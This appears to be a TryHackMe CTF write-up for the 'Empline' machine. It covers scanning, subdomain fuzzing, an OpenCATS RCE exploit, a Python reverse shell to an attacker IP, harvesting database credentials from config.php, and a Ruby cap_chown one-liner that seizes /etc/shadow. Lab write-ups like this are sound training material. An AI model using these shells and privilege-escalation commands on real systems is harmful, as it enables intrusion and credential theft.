---
layout: post
title:  "TryHackMe: Empline CTF Writeup"
author: sarpdora23
categories: [ TryHackMe, CTF,Writeup ]
tags: [red, yellow]
image: assets/images/empline.png
description: "TryHackMe: Empline CTF Writeup"
featured: true
hidden: true
---
TryHackMe medium level web machine Empline boot2root walkthrough.
## Discovery Part

First thing I scan all ports what services are running on the server.

```bash
sudo nmap -sC -sV -p- 10.10.70.209
```

![1.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/1.png)

Server has a **web service**, **ssh** service and **mysql** database. Then I go to webpage.

![2.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/2.png)

Nothing is there… so I wonder is there any subdomain. First assigned ip to empline.thm in **“/etc/hosts”** document. Then I use **wfuzz** for find subdomains.

```bash
sudo wfuzz -H "Host:FUZZ.empline.thm" -u http://empline.thm/ -w /usr/share/wordlists/SecList
```

![Untitled](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled.png)

So there is one subdomain “**job.empline.thm**”. I look what is in there and I find login page

![3.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/3.png)

 and also “**opencats”** is running on the system. I checked source code any information about “**opencats version**”.

![4.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/4.png)

So I know version number and I search any exploit for “**opencats 0.9.4**”.

![5.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/5.png)

## Enumeration Part

Perfect!! There is a “**RCE(Remote Code Execution)”** exploit suitable for the machine. I get the exploit from searchsploit and run…..

![6.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/6.png)

It is working!!! But something is wrong. Yes I can run the commands but its not like real shell.

![7.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/7.png)

It is not exactly shell but we can get shell easily from command execution. Server has python3 so I can run python code. I made reverse shell payload with python.

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.8.50",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

I run the python code on target machine and In my machine I use netcat for listen port.

```python
nc -lvnp 1234
```

![8.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/8.png)

I got the shell… I checked is there any config files for **“opencats”**. I went to “**/var/www/html/opencats**” folder. Let’s look files.

![9.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/9.png)

**“config.php”** file can contains important data. I read the file with cat command.

![10.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/10.png)

I can login mysql database with this information. Let’s try…

![11.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/11.png)

I succesfully loged in with credentials. I found databases. Let’s continue with opencats.

![Untitled](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%201.png)

“**user**” table looks interesting.

![12.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/12.png)

There are encrypted passwords. I check “**crackstation.net**”

![13.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/13.png)

I know the password but I need user’s name for ssh. I looked users on the machine.

![Untitled](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%202.png)

Try login ssh with username and password.

![14.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/14.png)

## Privilege Escalation Part

Find and read user flag.

![15.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/15.png)

Last thing I need to become root for successfully finish the machine. I upload “**linpeas.sh”** tool for find any information become root.

![16.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/16.png)

**Linpeas** shows there are some capabilities user can. “**/usr/local/bin/ruby = cap_chown+ep**” means user can change any file’s owner with ruby. I change “**/etc/shadow**” file’s owner because if user write the shadow file then can change the root’s password.

```ruby
ruby -e 'require "fileutils"; FileUtils.chown "george", "george", "/etc/shadow"'
```

![17.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/17.png)

I changed root’s password. Let’s try to login root.

![18.png](../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/18.png)

### THANK YOU FOR READING 🙂

